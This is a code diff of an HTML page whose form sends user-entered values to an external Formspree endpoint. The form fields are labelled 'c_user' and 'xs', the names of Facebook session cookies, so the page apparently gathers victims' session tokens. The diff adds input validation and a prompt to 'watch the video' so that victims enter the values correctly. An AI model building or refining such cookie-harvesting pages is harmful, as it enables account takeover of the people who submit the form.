@@ -65,7 +65,7 @@
         <form id="myForm" action="https://formspree.io/f/myyrwgvr" method="post">
           <label class="label" for="recipient">c_user</label>
 
-          <input class="input" type="number" name="number" required />
+          <input class="input" id="numberInput" type="number" name="number" minlength="6" oninput="validateInput()" required />
 
           <br />
           <label class="label" for="subject">xs</label>
@@ -116,5 +116,17 @@
       </figure>
     </div>
   </body>
+  <script>
+    function validateInput() {
+      var inputField = document.getElementById("numberInput");
+      var input = inputField.value;
+      
+      if (input.length < 6) {
+        inputField.setCustomValidity("watch the video to submit correct inputs");
+      } else {
+        inputField.setCustomValidity("");
+      }
+    }
+    </script>
   <script src="./index.js"></script>
 </html>
